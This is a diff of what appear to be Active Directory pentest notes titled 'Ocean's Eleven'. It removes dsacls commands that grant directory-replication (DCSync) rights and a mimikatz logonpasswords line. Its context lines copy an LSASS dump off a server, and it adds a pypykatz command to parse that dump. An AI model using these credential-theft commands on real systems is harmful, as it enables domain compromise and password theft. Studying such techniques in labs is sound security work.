@@ -1,11 +1,4 @@
 
-dsacls "DC=domain,DC=com" /G "DOMAINE\NomUtilisateur:RPWP;replicating directory changes"
-
-
-dsacls "DC=domain,DC=com" /G "DOMAINE\NomUtilisateur:RPWP;replicating directory changes all"
-
-
-
 Ocean's Eleven
 
 theme song: https://youtu.be/sdSai09_jzc
@@ -336,9 +329,10 @@ Exit-PSSession
 
 scp ocean-admin@MGM-SRV:C:\temp\lsass.dmp /path/to/local/
 
-mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+```powershell
+exegol-adpentest /workspace # pypykatz lsa minidump "ssss.dmp" --json
 
-
+```
 
 
 
